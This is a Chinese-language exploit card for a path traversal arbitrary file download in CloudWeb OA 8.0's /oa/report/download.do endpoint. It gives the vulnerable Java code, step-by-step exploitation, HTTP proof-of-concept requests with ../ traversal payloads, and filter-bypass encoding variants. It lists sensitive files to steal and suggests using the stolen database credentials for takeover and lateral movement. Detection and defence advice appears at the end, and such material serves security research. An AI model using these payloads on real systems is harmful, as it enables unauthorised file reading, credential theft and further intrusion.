---
id: web-generic-file-inclusion-cloudweb-report-download-filename-traversal
title: 云网OA report/download.do 的 fileName 直接拼接根路径：相对路径穿越任意文件下载
type: scenario
domain: web
path: web/generic/file-inclusion
technique: cloudweb-report-download-filename-traversal
aliases:
- 云网OA 任意文件下载
- ReportController download 穿越
- report/download.do fileName
- 云网OA 文件读取
tags:
- file-download
- path-traversal
- java
- oa
- cloudweb
- arbitrary-file-read
cve: []
severity: high
confidence: medium
affected_versions: 云网OA 8.0（原文源码目录 yimioa-oa_git8.0 与安装页版本标注）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V582
  verified_at: '2026-11-12T12:50:48+08:00'
  notes: 已对照原文（174 行）与全部 22 张截图核对：图06 模板列表情形的下载功能；图07 Burp GET /oa/report/download.do?fileName=<URL 编码的财务汇总表.raq>；图08 ReportController#download 源码 new FileInputStream(Global.getRootPath()+"reportFiles/"+fileName)，调试器显示 path=D:\xiapi\Extensions\MySQL5.7.26\home\reportFiles\11.txt；图09 文件系统中 11.txt 位于 ...\MySQL5.7.26\home（reportFiles 上级）并打开内容 1123121333333333333；原文文字称将 11.txt 放到上级目录后'可以看到成功下载'。卡中代码路径、拼接方式、危害与 PoC 思路一致；原文未展示带 ../ 的具体请求串（图07 的 fileName 为正常模板名），且调试器路径与文件位置存在上述差异，故 confidence medium 合理；未在本机复跑；无 sources/source_url。dedup 推荐 new，5 个 related 均为其它产品（LuckyFrameWeb、万户OA、致远OA、mee-admin、OA logfile）的下载接口穿越，产品/代码路径不同，非同链。
---

## 一句话结论

云网OA 8.0 的 `GET /oa/report/download.do?fileName=` 由 `ReportController#download` 处理，`fileName` 未经规范化就被拼进 `Global.getRootPath() + "reportFiles/" + fileName` 并交给 `FileInputStream`；由于没有 `../` 过滤或 canonical 校验，攻击者可构造相对路径逃出 `reportFiles` 目录，下载应用进程可读的任意文件（配置、凭据、源码等）。

## 原理

- 代码路径：`com.cloudweb.oa.controller.ReportController#download(HttpServletResponse response, String fileName)`：
  ```java
  fileName = fileName.trim();
  response.setHeader("Content-Disposition", "attachment;filename=" + URLEncoder.encode(fileName.trim(), "UTF-8"));
  bis = new BufferedInputStream(new FileInputStream(
        Global.getRootPath() + "reportFiles/" + fileName));
  ```
- `fileName` 只做了 `trim()` 与响应头编码，未做 `..`/绝对路径/分隔符过滤，也未用 `File.getCanonicalPath()` 校验是否仍在 `reportFiles` 下。
- Java 的 `FileInputStream` 会按 OS 规则解析 `../` 与混合分隔符，因此可逐级跳出 `reportFiles`，读取项目目录、MySQL 数据目录、配置文件等。
- 原文的验证：该 OA 的 `Global.getRootPath()` 指向 MySQL 安装目录（`...\Extensions\MySQL5.7.26\home\`），作者把测试文件 `11.txt` 放到该根目录（`reportFiles` 的上级），再通过下载接口取回内容，证明路径可逃逸出预期目录；下载路径与内容在调试器/记事本中可见。
- 危害取决于应用进程权限：可读 `application.properties`（数据库口令）、源码、日志、`WEB-INF` 配置等，为后续数据库接管/重装/横向提供凭据。

## 触发条件

- 目标运行云网OA 8.0，`/oa/report/download.do` 可访问（原文请求带有 `name=admin` 等 Cookie，是否严格未授权需以目标配置为准，但该接口至少对已登录用户开放）。
- 应用进程对目标文件有读权限。
- `Global.getRootPath()` 的取值可由安装配置决定；攻击者可用相对路径从 `reportFiles` 向上穿越。

## 利用步骤

1. 登录（或未授权直达）报表模块，点击任一模板的“下载”抓包，确认请求为 `GET /oa/report/download.do?fileName=<模板名>`。
2. 将 `fileName` 替换为相对路径穿越，例如读取上级目录的测试文件：
   ```http
   GET /oa/report/download.do?fileName=..%2F11.txt HTTP/1.1
   Host: TARGET:8096
   ```
   结合原文环境（根路径为 MySQL home、测试文件放在其上级），可用更多 `../` 指到目标文件。
3. 根据响应 `Content-Disposition` 与响应体确认下载内容；批量尝试常见敏感文件（`application.properties`、`WEB-INF/classes/*`、`redmoonoa.sql`、日志、`my.ini` 等）。
4. 用拿到的数据库口令/配置继续攻击（连接 MySQL、重装 setup、横向等）。

## PoC

```http
GET /oa/report/download.do?fileName=..%2F..%2F11.txt HTTP/1.1
Host: TARGET:8096
Cookie: name=admin; JSESSIONID=<valid>
```

```text
# 预期：响应为 application/x-download，Content-Disposition 含文件名，响应体为 11.txt 内容
```

## 变体与关联

- 变体：Windows 下 `..\`、`%5c`、双写 `....//` 等分隔符/归一化差异；若接口做了一次 URL 解码，可二次编码。
- 变体：同类 OA 的 `download`/`export` 接口常复用相同拼接模式，可批量审计 `Global.getRootPath() + ... + fileName`。
- 关联：[[web-generic-file-inclusion-cmsv6-downloadlogger-filename-read]]（fileName 直入文件读取的同类产品卡）、[[web-java-deser-fastjson-cloudweb-updateuisetup-jdbcrowset-jndi]]、[[web-generic-auth-oa-setup-unauth-reinstall-admin-password]]（同一产品的其它入口）。
- 边界：接口做 `getCanonicalPath` 前缀校验、文件名白名单、禁止 `..`/分隔符时失效；进程权限过低时只能读到低敏文件。

## 检测与防御

- 检测：下载请求的 `fileName` 中含 `../`、`..\\`、编码后的 `%2e%2e` 等；响应体与文件名不符（下载了非模板文件）；应用日志中的 `FileInputStream` 路径越界。
- 防御：对 `fileName` 做白名单（仅允许模板文件名/ID），服务端用 ID 查库映射真实路径；使用 `Path.normalize()` 后校验前缀仍在 `reportFiles` 下；禁止绝对路径与分隔符；以最小权限运行应用进程。
